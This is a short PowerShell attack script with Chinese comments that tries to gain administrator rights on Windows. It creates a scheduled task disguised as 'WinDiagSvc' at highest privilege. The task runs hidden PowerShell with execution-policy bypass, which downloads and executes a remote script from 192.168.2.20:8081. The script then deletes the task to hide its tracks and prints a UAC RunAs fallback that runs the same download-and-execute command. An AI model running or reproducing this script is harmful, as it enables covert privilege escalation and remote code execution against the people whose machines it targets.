# ps_elevate.ps1 —— 自提升到管理员（UAC 提示 / 计划任务静默方式）
# 方式A：弹 UAC（用户点一下即可）
$p = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Host '[+] already admin'; return }

Write-Host '[*] trying silent elevation via scheduled task (highest)...'
$arg = "-nop -w hidden -ep bypass -c `"irm http://192.168.2.20:8081/open_attack_surface.ps1 | iex`""
schtasks /create /tn "WinDiagSvc" /tr "powershell $arg" /sc once /st 00:00 /rl HIGHEST /f 2>$null | Out-Null
schtasks /run /tn "WinDiagSvc" 2>$null | Out-Null
Start-Sleep 2
schtasks /delete /tn "WinDiagSvc" /f 2>$null | Out-Null
Write-Host '[+] scheduled-task elevation attempted (works if current user is local admin, no UAC prompt on some configs)'
Write-Host '[i] if not admin-capable, fallback: Start-Process powershell -Verb RunAs -ArgumentList "-nop -ep bypass -c irm http://192.168.2.20:8081/open_attack_surface.ps1 | iex"'
